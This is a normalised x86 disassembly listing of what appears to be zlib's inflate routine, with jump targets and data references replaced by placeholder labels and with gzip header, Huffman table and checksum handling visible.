shl eax 0x10
add ecx eax
mov eax ebx
shr eax 0x8
and eax 0xff00
shl ecx 0x8
add ecx eax
shr ebx 0x18
lea eax [ ecx + ebx ]
mov ecx [ esp + 0x40 ]
mov [ edi + 0x18 ] eax
mov [ ecx + 0x30 ] eax
xor ebx ebx
xor esi esi
mov [ edi ] 0xa
mov eax ecx
test edx edx
je r-xdata
mov ecx [ esp + 0x20 ]
mov [ eax + 0xc ] ecx
mov ecx [ esp + 0x18 ]
mov [ eax ] ebp
mov [ eax + 0x10 ] ecx
mov [ eax + 0x4 ] edx
mov [ edi + 0x3c ] esi
pop esi
pop ebp
mov [ edi + 0x38 ] ebx
pop ebx
mov eax 0x2
pop edi
add esp 0x2c
retn
xor eax eax
xor edx edx
xor ecx ecx
call sub_43e500
mov edx [ esp + 0x40 ]
mov [ edi + 0x18 ] eax
mov [ edx + 0x30 ] eax
mov edx [ esp + 0x10 ]
mov [ edi ] 0xb
cmp esi 0x3
jae r-xdata
mov ecx esi
and ecx 0x7
shr ebx cl
sub esi ecx
mov [ edi ] 0x18
jmp r-xdata
mov ecx ebx
mov eax ebx
not ecx
and eax 0xffff
shr ecx 0x10
cmp eax ecx
je r-xdata
lea esp [ esp ]
mov [ edi ] 0xb
jmp r-xdata
cmp eax edx
jbe r-xdata
mov ecx ebx
and ecx 0x1f
shr ebx 0x5
add ecx 0x101
mov eax ebx
mov [ edi + 0x60 ] ecx
shr ebx 0x5
mov ecx ebx
and eax 0x1f
and ecx 0xf
inc eax
add ecx 0x4
shr ebx 0x4
sub esi 0xe
cmp [ edi + 0x60 ] 0x11e
mov [ edi + 0x64 ] eax
mov [ edi + 0x5c ] ecx
ja r-xdata
test edx edx
je r-xdata
mov eax 0x13
cmp [ edi + 0x68 ] eax
jae r-xdata
lea ecx [ ecx ]
cmp [ edi ] 0x1b
je r-xdata
mov ecx [ edi + 0x54 ]
mov eax 0x1
shl eax cl
mov ecx [ edi + 0x4c ]
dec eax
and eax ebx
mov eax [ ecx + eax * 4 ]
mov ecx eax
shr ecx 0x8
movzx ecx cl
mov [ esp + 0x14 ] eax
cmp ecx esi
jbe r-xdata
mov ecx [ edi + 0x54 ]
mov eax 0x1
shl eax cl
dec eax
and eax ebx
mov ecx eax
mov eax [ edi + 0x4c ]
mov eax [ eax + ecx * 4 ]
mov ecx eax
shr ecx 0x8
movzx ecx cl
mov [ esp + 0x14 ] eax
cmp ecx esi
jbe r-xdata
cmp [ esp + 0x18 ] 0x102
jb r-xdata
mov [ edi ] 0x14
cmp esi eax
jae r-xdata
test al 0xf0
jne r-xdata
nop
mov ecx [ edi + 0x2c ]
sub ecx [ esp + 0x18 ]
add ecx [ esp + 0x28 ]
cmp [ edi + 0x44 ] ecx
jbe r-xdata
cmp esi eax
jae r-xdata
mov eax [ esp + 0x40 ]
mov ecx [ esp + 0x20 ]
mov [ eax + 0xc ] ecx
mov ecx [ esp + 0x18 ]
mov [ eax + 0x10 ] ecx
mov [ eax ] ebp
mov [ eax + 0x4 ] edx
cmp [ edi + 0x28 ] 0x0
mov [ edi + 0x38 ] ebx
mov [ edi + 0x3c ] esi
jne r-xdata
mov ecx [ esp + 0x28 ]
sub ecx [ esp + 0x18 ]
mov eax [ edi + 0x44 ]
cmp eax ecx
jbe r-xdata
mov eax [ esp + 0x20 ]
mov cl [ edi + 0x40 ]
mov [ eax ] cl
inc eax
dec [ esp + 0x18 ]
mov [ esp + 0x20 ] eax
mov [ edi ] 0x12
jmp r-xdata
mov [ edi ] 0x19
cmp esi 0x20
jae r-xdata
mov [ edi ] 0x1a
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov eax [ esp + 0x28 ]
mov ebx [ esp + 0x40 ]
call sub_43cc40
test eax eax
je r-xdata
cmp [ edi ] 0x18
jge r-xdata
test [ edi + 0x8 ] 0x2
je r-xdata
test edx edx
je r-xdata
mov ecx [ edi ]
cmp ecx 0x1c
jbe r-xdata
test ebx 0xe000
je r-xdata
mov ecx [ esp + 0x40 ]
mov [ ecx + 0x18 ] r--data
jmp r-xdata
movzx eax [ ebp ]
mov ecx esi
shl eax cl
dec edx
add esi 0x8
inc ebp
add ebx eax
mov [ esp + 0x10 ] edx
cmp esi 0x10
jb r-xdata
test [ edi + 0x10 ] 0x200
je r-xdata
mov [ eax + 0x4 ] ebx
movzx eax [ ebp ]
mov ecx esi
shl eax cl
dec edx
add esi 0x8
inc ebp
add ebx eax
mov [ esp + 0x10 ] edx
cmp esi 0x20
jb r-xdata
test [ edi + 0x10 ] 0x200
je r-xdata
mov ecx ebx
and ecx 0xff
mov [ eax + 0x8 ] ecx
mov ecx [ edi + 0x20 ]
mov eax ebx
shr eax 0x8
mov [ ecx + 0xc ] eax
movzx eax [ ebp ]
mov ecx esi
shl eax cl
dec edx
add esi 0x8
inc ebp
add ebx eax
mov [ esp + 0x10 ] edx
cmp esi 0x10
jb r-xdata
mov [ edi ] 0x5
mov [ eax + 0x10 ] 0x0
mov eax [ edi + 0x20 ]
mov [ edi + 0x40 ] ebx
test eax eax
je r-xdata
test edx edx
je r-xdata
test ecx ecx
je r-xdata
mov ecx edx
mov [ esp + 0x14 ] edx
mov [ edi + 0x40 ] 0x0
mov [ edi ] 0x7
mov [ eax + 0x1c ] 0x0
xor eax eax
mov [ edi ] 0x8
mov [ eax + 0x24 ] 0x0
xor eax eax
lea ebx [ ebx ]
push 0x0
xor edx edx
xor ecx ecx
call sub_43e210
mov ecx [ esp + 0x44 ]
mov edx [ esp + 0x14 ]
mov [ edi + 0x18 ] eax
mov [ ecx + 0x30 ] eax
add esp 0x4
mov [ edi ] 0xb
jmp r-xdata
mov ecx [ edi + 0x10 ]
sar ecx 0x9
and ecx 0x1
mov [ eax + 0x2c ] ecx
mov edx [ edi + 0x20 ]
mov [ edx + 0x30 ] 0x1
movzx ecx [ edi + 0x18 ]
cmp ebx ecx
je r-xdata
lea esp [ esp ]
movzx eax [ ebp ]
mov ecx esi
shl eax cl
dec edx
add esi 0x8
inc ebp
add ebx eax
mov [ esp + 0x10 ] edx
cmp esi 0x20
jb r-xdata
mov ecx ebx
shr ebx 0x1
mov eax ebx
and ecx 0x1
and eax 0x3
dec esi
mov [ edi + 0x4 ] ecx
cmp eax 0x3
ja r-xdata
test edx edx
je r-xdata
xor ebx ebx
mov [ edi + 0x40 ] eax
xor esi esi
mov [ edi ] 0xe
mov eax [ esp + 0x40 ]
mov [ eax + 0x18 ] r--data
jmp r-xdata
movzx eax [ ebp ]
mov ecx esi
shl eax cl
dec edx
add esi 0x8
inc ebp
add ebx eax
mov [ esp + 0x10 ] edx
cmp esi 0x20
jb r-xdata
mov ecx [ esp + 0x18 ]
cmp eax ecx
jbe r-xdata
mov eax edx
mov [ esp + 0x14 ] edx
mov eax [ esp + 0x40 ]
mov [ eax + 0x18 ] r--data
jmp r-xdata
cmp eax 0x1e
ja r-xdata
movzx eax [ ebp ]
mov ecx esi
shl eax cl
dec edx
add esi 0x8
inc ebp
add ebx eax
mov [ esp + 0x10 ] edx
cmp esi 0xe
jb r-xdata
lea eax [ edi + 0x530 ]
lea ecx [ edi + 0x6c ]
mov [ ecx ] eax
mov [ edi + 0x4c ] eax
lea eax [ edi + 0x2f0 ]
push eax
push ecx
lea edx [ edi + 0x54 ]
push 0x13
lea ecx [ edi + 0x70 ]
push 0x0
mov [ edx ] 0x7
call sub_43ebf0
mov edx [ esp + 0x20 ]
add esp 0x10
mov [ esp + 0x30 ] eax
test eax eax
je r-xdata
jmp r-xdata
mov eax [ edi + 0x68 ]
movzx eax [ eax * 2 + r--data ]
mov ecx ebx
and ecx 0x7
mov [ edi + eax * 2 + 0x70 ] cx
inc [ edi + 0x68 ]
mov ecx [ edi + 0x68 ]
shr ebx 0x3
sub esi 0x3
cmp ecx [ edi + 0x5c ]
jb r-xdata
test edx edx
je r-xdata
lea eax [ edi + 0x530 ]
lea ecx [ edi + 0x6c ]
mov [ ecx ] eax
mov [ edi + 0x4c ] eax
lea eax [ edi + 0x2f0 ]
push eax
mov eax [ edi + 0x60 ]
push ecx
push eax
lea edx [ edi + 0x54 ]
lea ecx [ edi + 0x70 ]
push 0x1
mov [ edx ] 0x9
call sub_43ebf0
add esp 0x10
mov [ esp + 0x30 ] eax
test eax eax
je r-xdata
mov ecx eax
shr ecx 0x10
cmp ecx 0x10
jae r-xdata
test edx edx
je r-xdata
test al al
je r-xdata
test edx edx
je r-xdata
mov eax [ esp + 0x40 ]
mov edx [ esp + 0x18 ]
mov ecx [ esp + 0x20 ]
mov [ eax + 0x10 ] edx
mov edx [ esp + 0x28 ]
mov [ eax + 0xc ] ecx
mov ecx [ esp + 0x10 ]
push edx
mov [ eax ] ebp
mov [ eax + 0x4 ] ecx
push eax
mov [ edi + 0x38 ] ebx
mov [ edi + 0x3c ] esi
call sub_43e760
mov eax [ esp + 0x48 ]
mov edx [ eax + 0x10 ]
mov ecx [ eax + 0xc ]
mov ebp [ eax ]
mov eax [ eax + 0x4 ]
mov ebx [ edi + 0x38 ]
mov esi [ edi + 0x3c ]
mov [ esp + 0x20 ] edx
add esp 0x8
mov [ esp + 0x20 ] ecx
mov [ esp + 0x10 ] eax
mov edx eax
jmp r-xdata
mov ecx [ edi + 0x48 ]
mov eax 0x1
shl eax cl
dec eax
and eax ebx
add [ edi + 0x40 ] eax
shr ebx cl
sub esi ecx
lea ecx [ ecx ]
mov ecx eax
shr ecx 0x8
movzx ecx cl
shr ebx cl
sub esi ecx
mov [ esp + 0x24 ] ecx
test al 0x40
je r-xdata
mov ecx eax
shr ecx 0x8
mov [ esp + 0x34 ] ecx
movzx ecx cl
mov [ esp + 0x24 ] ecx
movzx ecx al
add ecx [ esp + 0x24 ]
mov [ esp + 0x2c ] eax
mov eax 0x1
shl eax cl
mov ecx [ esp + 0x24 ]
dec eax
and eax ebx
shr eax cl
mov ecx [ esp + 0x14 ]
shr ecx 0x10
add eax ecx
mov ecx eax
mov eax [ edi + 0x50 ]
mov eax [ eax + ecx * 4 ]
movzx ecx [ esp + 0x34 ]
mov [ esp + 0x14 ] eax
shr eax 0x8
movzx eax al
add eax ecx
cmp eax esi
jbe r-xdata
movzx eax [ ebp ]
mov ecx esi
shl eax cl
mov ecx [ edi + 0x58 ]
dec edx
add esi 0x8
add ebx eax
mov eax 0x1
shl eax cl
mov ecx [ edi + 0x50 ]
inc ebp
mov [ esp + 0x10 ] edx
dec eax
and eax ebx
mov eax [ ecx + eax * 4 ]
mov ecx eax
shr ecx 0x8
movzx ecx cl
mov [ esp + 0x14 ] eax
cmp ecx esi
ja r-xdata
mov [ edi ] 0x16
mov eax [ esp + 0x40 ]
mov [ eax + 0x18 ] r--data
jmp r-xdata
mov ecx [ edi + 0x48 ]
mov eax 0x1
shl eax cl
dec eax
and eax ebx
add [ edi + 0x44 ] eax
shr ebx cl
sub esi ecx
test edx edx
je r-xdata
mov ecx [ esp + 0x20 ]
sub ecx eax
mov eax [ edi + 0x40 ]
mov [ esp + 0x2c ] ecx
mov [ esp + 0x34 ] eax
sub eax ecx
mov ecx [ edi + 0x30 ]
mov [ esp + 0x14 ] eax
cmp eax ecx
jbe r-xdata
mov eax [ esp + 0x28 ]
sub eax [ esp + 0x18 ]
mov ecx [ esp + 0x40 ]
add [ ecx + 0x14 ] eax
add [ edi + 0x1c ] eax
mov [ esp + 0x28 ] eax
test eax eax
je r-xdata
test edx edx
je r-xdata
cmp esi 0x20
jae r-xdata
mov esi [ esp + 0x40 ]
mov ebp [ esp + 0x38 ]
sub ebp [ esi + 0x4 ]
mov ebx [ esp + 0x28 ]
sub ebx [ esi + 0x10 ]
add [ esi + 0x8 ] ebp
add [ esi + 0x14 ] ebx
add [ edi + 0x1c ] ebx
cmp [ edi + 0x8 ] 0x0
je r-xdata
mov [ edi ] 0x1c
mov edx [ esp + 0x28 ]
cmp edx [ eax + 0x10 ]
je r-xdata
mov eax [ edi + 0x20 ]
mov [ edi + 0x10 ] 0x0
test eax eax
je r-xdata
cmp ebx 0x8b1f
jne r-xdata
movzx eax [ ebp ]
mov ecx esi
shl eax cl
dec edx
add esi 0x8
inc ebp
add ebx eax
mov [ esp + 0x10 ] edx
cmp esi 0x10
jb r-xdata
mov eax [ esp + 0x40 ]
pop esi
pop ebp
pop ebx
mov eax 0xfffffffe
pop edi
add esp 0x2c
retn
mov eax [ edi + 0x20 ]
test eax eax
je r-xdata
mov eax [ esp + 0x40 ]
mov [ eax + 0x18 ] r--data
jmp r-xdata
mov [ edi ] 0x1b
xor ebx ebx
xor esi esi
mov [ edi ] 0x3
jmp r-xdata
mov eax [ edi + 0x18 ]
mov ecx ebx
mov edx ebx
shr ecx 0x8
shr edx 0x10
mov [ esp + 0x1c ] bl
mov [ esp + 0x1d ] cl
mov [ esp + 0x1e ] dl
shr ebx 0x18
mov edx 0x4
lea ecx [ esp + 0x1c ]
mov [ esp + 0x1f ] bl
call sub_43e220
mov edx [ esp + 0x10 ]
mov [ edi + 0x18 ] eax
test edx edx
je r-xdata
xor ebx ebx
xor esi esi
mov [ edi ] 0x4
mov eax [ edi + 0x18 ]
mov [ esp + 0x1c ] bl
shr ebx 0x8
mov edx 0x2
lea ecx [ esp + 0x1c ]
mov [ esp + 0x1d ] bl
call sub_43e220
mov edx [ esp + 0x10 ]
mov [ edi + 0x18 ] eax
test edx edx
je r-xdata
test [ edi + 0x10 ] 0x200
je r-xdata
mov [ eax + 0x14 ] ebx
movzx eax [ ebp ]
mov ecx esi
shl eax cl
dec edx
add esi 0x8
inc ebp
add ebx eax
mov [ esp + 0x10 ] edx
cmp esi 0x10
jb r-xdata
cmp [ edi + 0x40 ] 0x0
jne r-xdata
mov eax [ edi + 0x20 ]
test eax eax
je r-xdata
cmp [ esp + 0x24 ] 0x0
mov eax [ esp + 0x14 ]
je r-xdata
mov ecx [ eax + 0x1c ]
mov [ esp + 0x34 ] ecx
test ecx ecx
je r-xdata
cmp [ esp + 0x24 ] 0x0
mov eax [ esp + 0x14 ]
je r-xdata
mov ecx [ eax + 0x24 ]
mov [ esp + 0x34 ] ecx
test ecx ecx
je r-xdata
xor ebx ebx
xor esi esi
mov eax [ esp + 0x40 ]
mov [ eax + 0x18 ] r--data
jmp r-xdata
movzx eax [ ebp ]
mov ecx esi
shl eax cl
dec edx
add esi 0x8
inc ebp
add ebx eax
mov [ esp + 0x10 ] edx
cmp esi 0x10
jb r-xdata
shr ebx 0x2
sub esi 0x2
jmp r-xdata
jmp [ eax * 4 + jump_table_43e1f8 ]
movzx eax [ ebp ]
mov ecx esi
shl eax cl
dec edx
add esi 0x8
inc ebp
add ebx eax
mov [ esp + 0x10 ] edx
cmp esi 0x3
jb r-xdata
test edx edx
je r-xdata
test eax eax
je r-xdata
mov eax ecx
mov [ esp + 0x14 ] eax
mov [ edi + 0x68 ] 0x0
mov [ edi ] 0x10
mov [ edi + 0x68 ] 0x0
mov [ edi ] 0x11
mov ecx [ esp + 0x40 ]
mov [ ecx + 0x18 ] r--data
jmp r-xdata
mov edx [ edi + 0x68 ]
movzx ecx [ edx * 2 + r--data ]
xor edx edx
mov [ edi + ecx * 2 + 0x70 ] dx
inc [ edi + 0x68 ]
cmp [ edi + 0x68 ] eax
jb r-xdata
cmp esi 0x3
jae r-xdata
movzx eax [ ebp ]
mov ecx esi
shl eax cl
dec edx
add esi 0x8
inc ebp
add ebx eax
mov [ esp + 0x10 ] edx
cmp esi 0x3
jb r-xdata
mov edx [ edi + 0x6c ]
lea ecx [ edi + 0x2f0 ]
push ecx
mov ecx [ edi + 0x60 ]
lea eax [ edi + 0x6c ]
push eax
mov eax [ edi + 0x64 ]
mov [ edi + 0x50 ] edx
push eax
lea edx [ edi + 0x58 ]
lea ecx [ edi + ecx * 2 + 0x70 ]
push 0x2
mov [ edx ] 0x6
call sub_43ebf0
add esp 0x10
mov [ esp + 0x30 ] eax
test eax eax
je r-xdata
mov ecx [ esp + 0x40 ]
mov edx [ esp + 0x10 ]
mov [ ecx + 0x18 ] r--data
jmp r-xdata
mov cx [ esp + 0x16 ]
cmp cx 0x10
jne r-xdata
mov ecx eax
shr ecx 0x8
movzx ecx cl
cmp esi ecx
jae r-xdata
movzx eax [ ebp ]
mov ecx esi
shl eax cl
mov ecx [ edi + 0x54 ]
dec edx
add esi 0x8
add ebx eax
mov eax 0x1
shl eax cl
mov ecx [ edi + 0x4c ]
inc ebp
mov [ esp + 0x10 ] edx
dec eax
and eax ebx
mov eax [ ecx + eax * 4 ]
mov ecx eax
shr ecx 0x8
movzx ecx cl
mov [ esp + 0x14 ] eax
cmp ecx esi
ja r-xdata
mov ecx eax
shr ecx 0x8
movzx ecx cl
shr ebx cl
sub esi ecx
mov [ esp + 0x24 ] ecx
mov ecx eax
shr ecx 0x10
mov [ edi + 0x40 ] ecx
test al al
jne r-xdata
test al 0xf0
jne r-xdata
movzx eax [ ebp ]
mov ecx esi
shl eax cl
mov ecx [ edi + 0x54 ]
dec edx
add esi 0x8
add ebx eax
mov eax 0x1
shl eax cl
mov ecx [ edi + 0x4c ]
inc ebp
mov [ esp + 0x10 ] edx
dec eax
and eax ebx
mov eax [ ecx + eax * 4 ]
mov ecx eax
shr ecx 0x8
movzx ecx cl
mov [ esp + 0x14 ] eax
cmp ecx esi
ja r-xdata
movzx eax [ ebp ]
mov ecx esi
shl eax cl
dec edx
add esi 0x8
inc ebp
add ebx eax
mov [ esp + 0x10 ] edx
cmp esi [ edi + 0x48 ]
jb r-xdata
mov ecx eax
movzx eax al
shr ecx 0x10
and eax 0xf
mov [ edi + 0x44 ] ecx
mov [ edi + 0x48 ] eax
mov [ edi ] 0x15
mov eax [ esp + 0x40 ]
mov [ eax + 0x18 ] r--data
jmp r-xdata
movzx ecx [ esp + 0x2d ]
mov eax [ esp + 0x14 ]
shr ebx cl
sub esi ecx
test edx edx
je r-xdata
test edx edx
je r-xdata
movzx eax [ ebp ]
mov ecx esi
shl eax cl
dec edx
add esi 0x8
inc ebp
add ebx eax
mov [ esp + 0x10 ] edx
cmp esi [ edi + 0x48 ]
jb r-xdata
sub ecx eax
mov [ esp + 0x18 ] ecx
mov ecx [ esp + 0x34 ]
sub ecx eax
mov eax [ esp + 0x20 ]
mov [ edi + 0x40 ] ecx
lea ebx [ ebx ]
mov eax ecx
mov [ esp + 0x14 ] eax
mov ecx [ edi + 0x34 ]
sub ecx eax
add ecx [ edi + 0x30 ]
mov eax [ esp + 0x14 ]
sub eax ecx
mov ecx [ edi + 0x34 ]
add ecx [ edi + 0x28 ]
mov [ esp + 0x14 ] eax
sub ecx eax
jmp r-xdata
cmp [ edi + 0x10 ] 0x0
mov eax [ esp + 0x18 ]
mov [ esp + 0x28 ] eax
mov eax ebx
jne r-xdata
cmp [ edi + 0x10 ] 0x0
je r-xdata
movzx eax [ ebp ]
mov ecx esi
shl eax cl
dec edx
add esi 0x8
inc ebp
add ebx eax
mov [ esp + 0x10 ] edx
cmp esi 0x20
jb r-xdata
cmp ebx [ edi + 0x1c ]
je r-xdata
test edx edx
je r-xdata
mov ecx [ edi + 0x4 ]
neg ecx
sbb ecx ecx
and ecx 0x40
xor edx edx
cmp [ edi ] 0xb
setne dl
dec edx
and edx 0x80
add ecx edx
add ecx [ edi + 0x3c ]
mov [ esi + 0x2c ] ecx
test ebp ebp
jne r-xdata
test ebx ebx
je r-xdata
test [ edi + 0x8 ] 0x1
je r-xdata
mov [ eax + 0x30 ] 0xffffffff
push 0x0
xor edx edx
xor ecx ecx
call sub_43e210
add esp 0x4
mov edx 0x2
lea ecx [ esp + 0x1c ]
mov [ edi + 0x18 ] eax
mov [ esp + 0x1c ] 0x1f
mov [ esp + 0x1d ] 0x8b
call sub_43e220
mov edx [ esp + 0x10 ]
xor ebx ebx
mov [ edi + 0x18 ] eax
xor esi esi
mov [ edi ] 0x1
jmp r-xdata
test [ edi + 0x10 ] 0x200
je r-xdata
mov ecx ebx
shr ecx 0x8
and ecx 0x1
mov [ eax ] ecx
xor ebx ebx
xor esi esi
jmp r-xdata
mov eax [ edi + 0x18 ]
mov [ esp + 0x1c ] bl
shr ebx 0x8
mov edx 0x2
lea ecx [ esp + 0x1c ]
mov [ esp + 0x1d ] bl
call sub_43e220
mov edx [ esp + 0x10 ]
mov [ edi + 0x18 ] eax
test [ edi + 0x10 ] 0x200
je r-xdata
mov eax [ eax + 0x10 ]
mov [ esp + 0x34 ] eax
test eax eax
je r-xdata
test [ edi + 0x10 ] 0x200
je r-xdata
cmp eax edx
jb r-xdata
mov ecx [ edi + 0x40 ]
cmp ecx [ eax + 0x20 ]
jae r-xdata
test [ edi + 0x10 ] 0x200
je r-xdata
cmp eax edx
jb r-xdata
mov ecx [ edi + 0x40 ]
cmp ecx [ eax + 0x28 ]
jae r-xdata
test edx edx
je r-xdata
shr ebx 0x2
mov [ edi ] 0xd
sub esi 0x2
jmp r-xdata
shr ebx 0x2
mov [ edi + 0x4c ] r--data
mov [ edi + 0x54 ] 0x9
mov [ edi + 0x50 ] r--data
mov [ edi + 0x58 ] 0x5
mov [ edi ] 0x12
sub esi 0x2
jmp r-xdata
shr ebx 0x2
mov [ edi ] 0xf
sub esi 0x2
jmp r-xdata
mov eax [ esp + 0x40 ]
mov [ eax + 0x18 ] r--data
mov [ edi ] 0x1b
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x20 ]
push ecx
push ebp
push edx
call sub_443790
mov eax [ esp + 0x20 ]
sub [ esp + 0x1c ] eax
sub [ esp + 0x24 ] eax
add [ esp + 0x2c ] eax
mov edx [ esp + 0x1c ]
add esp 0xc
add ebp eax
sub [ edi + 0x40 ] eax
jmp r-xdata
mov edx [ esp + 0x10 ]
mov [ edi ] 0x12
mov edx [ esp + 0x40 ]
mov [ edx + 0x18 ] r--data
mov edx [ esp + 0x10 ]
jmp r-xdata
cmp cx 0x11
movzx ecx ah
mov [ esp + 0x2c ] ecx
jne r-xdata
movzx ecx ah
lea eax [ ecx + 0x2 ]
mov [ esp + 0x2c ] ecx
cmp esi eax
jae r-xdata
movzx ecx ah
mov eax [ edi + 0x68 ]
shr ebx cl
sub esi ecx
mov cx [ esp + 0x16 ]
mov [ edi + eax * 2 + 0x70 ] cx
inc [ edi + 0x68 ]
jmp r-xdata
test edx edx
je r-xdata
test al 0x20
je r-xdata
mov [ edi ] 0x17
jmp r-xdata
mov ecx eax
shr ecx 0x8
mov [ esp + 0x34 ] ecx
movzx ecx cl
mov [ esp + 0x24 ] ecx
movzx ecx al
add ecx [ esp + 0x24 ]
mov [ esp + 0x2c ] eax
mov eax 0x1
shl eax cl
mov ecx [ esp + 0x24 ]
dec eax
and eax ebx
shr eax cl
mov ecx [ esp + 0x14 ]
shr ecx 0x10
add eax ecx
mov ecx eax
mov eax [ edi + 0x4c ]
mov eax [ eax + ecx * 4 ]
movzx ecx [ esp + 0x34 ]
mov [ esp + 0x14 ] eax
shr eax 0x8
movzx eax al
add eax ecx
cmp eax esi
jbe r-xdata
test edx edx
je r-xdata
movzx eax [ ebp ]
mov ecx esi
shl eax cl
mov ecx [ esp + 0x2c ]
dec edx
add esi 0x8
add ebx eax
movzx eax ch
mov [ esp + 0x24 ] eax
movzx ecx cl
add ecx eax
mov eax 0x1
shl eax cl
mov ecx [ esp + 0x24 ]
inc ebp
mov [ esp + 0x10 ] edx
dec eax
and eax ebx
shr eax cl
movzx ecx [ esp + 0x2e ]
add eax ecx
mov ecx [ edi + 0x50 ]
mov eax [ ecx + eax * 4 ]
mov [ esp + 0x14 ] eax
shr eax 0x8
movzx eax al
add eax [ esp + 0x24 ]
cmp eax esi
ja r-xdata
mov ecx [ esp + 0x2c ]
mov cl [ ecx ]
inc [ esp + 0x2c ]
mov [ eax ] cl
inc eax
sub [ esp + 0x14 ] 0x1
jne r-xdata
cmp [ edi + 0x40 ] 0x0
mov [ esp + 0x20 ] eax
jne r-xdata
mov ecx [ esp + 0x18 ]
cmp eax ecx
jbe r-xdata
mov eax ecx
jmp r-xdata
mov [ esp + 0x2c ] ecx
mov ecx [ edi + 0x40 ]
mov [ esp + 0x34 ] ecx
cmp eax ecx
jbe r-xdata
cmp eax [ edi + 0x18 ]
je r-xdata
and eax 0xff00
mov ecx ebx
shl ecx 0x10
add eax ecx
mov ecx ebx
shr ecx 0x8
and ecx 0xff00
shl eax 0x8
add eax ecx
mov ecx ebx
shr ecx 0x18
add eax ecx
mov eax [ esp + 0x28 ]
mov edx [ esp + 0x20 ]
mov ecx [ edi + 0x18 ]
sub edx eax
call sub_43e500
mov ecx [ esp + 0x20 ]
sub ecx eax
mov eax [ edi + 0x18 ]
jne r-xdata
xor ebx ebx
xor esi esi
mov ecx [ esp + 0x40 ]
mov [ ecx + 0x18 ] r--data
movzx eax [ ebp ]
mov ecx esi
shl eax cl
dec edx
add esi 0x8
inc ebp
add ebx eax
mov [ esp + 0x10 ] edx
cmp esi 0x20
jb r-xdata
mov eax [ esp + 0x30 ]
pop esi
pop ebp
pop ebx
pop edi
add esp 0x2c
retn
test ebx ebx
jne r-xdata
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov edx [ esp + 0x40 ]
mov [ edx + 0x18 ] r--data
mov edx [ esp + 0x10 ]
jmp r-xdata
movzx eax bl
shl eax 0x8
mov ecx ebx
shr ecx 0x8
add eax ecx
xor edx edx
mov ecx 0x1f
div ecx
test edx edx
jne r-xdata
xor ebx ebx
xor esi esi
mov [ edi ] 0x2
jmp r-xdata
mov eax [ edi + 0x18 ]
mov [ esp + 0x1c ] bl
shr ebx 0x8
mov edx 0x2
lea ecx [ esp + 0x1c ]
mov [ esp + 0x1d ] bl
call sub_43e220
mov edx [ esp + 0x10 ]
mov [ edi + 0x18 ] eax
sub edx ecx
add ebp ecx
sub [ edi + 0x40 ] ecx
mov [ esp + 0x10 ] edx
mov eax [ edi + 0x18 ]
test ebp ebp
jne r-xdata
mov eax [ edi + 0x20 ]
mov eax [ eax + 0x14 ]
sub eax [ edi + 0x40 ]
mov edx [ edi + 0x20 ]
mov edx [ edx + 0x18 ]
add ecx eax
cmp ecx edx
jbe r-xdata
sub edx eax
add ebp eax
cmp [ esp + 0x24 ] 0x0
mov [ esp + 0x10 ] edx
jne r-xdata
mov eax [ edi + 0x18 ]
test ebp ebp
jne r-xdata
movzx ecx [ eax + ebp ]
inc eax
mov [ esp + 0x14 ] eax
mov eax [ edi + 0x20 ]
mov [ esp + 0x24 ] ecx
test eax eax
je r-xdata
mov edx [ esp + 0x34 ]
mov al [ esp + 0x24 ]
mov [ edx + ecx ] al
inc [ edi + 0x40 ]
mov edx [ esp + 0x10 ]
sub edx eax
add ebp eax
cmp [ esp + 0x24 ] 0x0
mov [ esp + 0x10 ] edx
jne r-xdata
mov eax [ edi + 0x18 ]
test ebp ebp
jne r-xdata
movzx ecx [ eax + ebp ]
inc eax
mov [ esp + 0x14 ] eax
mov eax [ edi + 0x20 ]
mov [ esp + 0x24 ] ecx
test eax eax
je r-xdata
mov edx [ esp + 0x34 ]
mov al [ esp + 0x24 ]
mov [ edx + ecx ] al
inc [ edi + 0x40 ]
mov edx [ esp + 0x10 ]
lea eax [ ecx + 0x7 ]
cmp esi eax
jae r-xdata
lea eax [ ecx + 0x3 ]
cmp esi eax
jae r-xdata
mov eax [ edi + 0x68 ]
shr ebx cl
sub esi ecx
test eax eax
je r-xdata
test edx edx
je r-xdata
mov eax [ edi + 0x64 ]
add eax [ edi + 0x60 ]
cmp [ edi + 0x68 ] eax
jb r-xdata
movzx eax [ ebp ]
mov ecx esi
shl eax cl
dec edx
add esi 0x8
inc ebp
add ebx eax
mov eax [ esp + 0x14 ]
movzx ecx ah
mov [ esp + 0x10 ] edx
cmp esi ecx
jb r-xdata
test al 0x40
je r-xdata
movzx ecx [ esp + 0x2d ]
mov eax [ esp + 0x14 ]
shr ebx cl
sub esi ecx
test edx edx
je r-xdata
mov [ edi ] 0x12
jmp r-xdata
mov [ esp + 0x14 ] eax
xor ebx ebx
xor esi esi
mov eax [ esp + 0x40 ]
mov [ eax + 0x18 ] r--data
jmp r-xdata
mov edx [ esp + 0x28 ]
call sub_43e220
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ esp + 0x30 ]
test eax eax
jne r-xdata
mov edx [ esi + 0xc ]
mov ecx [ edi + 0x18 ]
sub edx ebx
mov eax ebx
call sub_43e500
mov ecx [ esi + 0xc ]
sub ecx ebx
mov eax [ edi + 0x18 ]
jne r-xdata
mov edx ebx
and dl 0xf
cmp dl 0x8
je r-xdata
mov edx [ esp + 0x14 ]
mov ecx ebp
call sub_43e220
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
xor eax eax
jmp r-xdata
mov edx [ esp + 0x14 ]
sub edx eax
jmp r-xdata
jmp r-xdata
mov edx [ esp + 0x14 ]
mov ecx ebp
call sub_43e220
mov edx [ esp + 0x10 ]
xor eax eax
jmp r-xdata
jmp r-xdata
mov edx [ esp + 0x14 ]
mov ecx ebp
call sub_43e220
mov edx [ esp + 0x10 ]
xor eax eax
jmp r-xdata
shr ebx cl
mov edx 0xfffffff9
mov eax ebx
and eax 0x7f
add eax 0xb
shr ebx 0x7
test edx edx
je r-xdata
shr ebx cl
mov edx 0xfffffffd
mov eax ebx
and eax 0x7
add eax 0x3
shr ebx 0x3
jmp r-xdata
test edx edx
je r-xdata
mov ecx [ esp + 0x40 ]
mov [ ecx + 0x18 ] r--data
jmp r-xdata
movzx ecx [ edi + eax * 2 + 0x6e ]
mov eax ebx
and eax 0x3
add eax 0x3
shr ebx 0x2
mov [ esp + 0x24 ] ecx
sub esi 0x2
jmp r-xdata
movzx eax [ ebp ]
mov ecx esi
shl eax cl
mov ecx [ esp + 0x2c ]
dec edx
add esi 0x8
add ebx eax
lea eax [ ecx + 0x2 ]
inc ebp
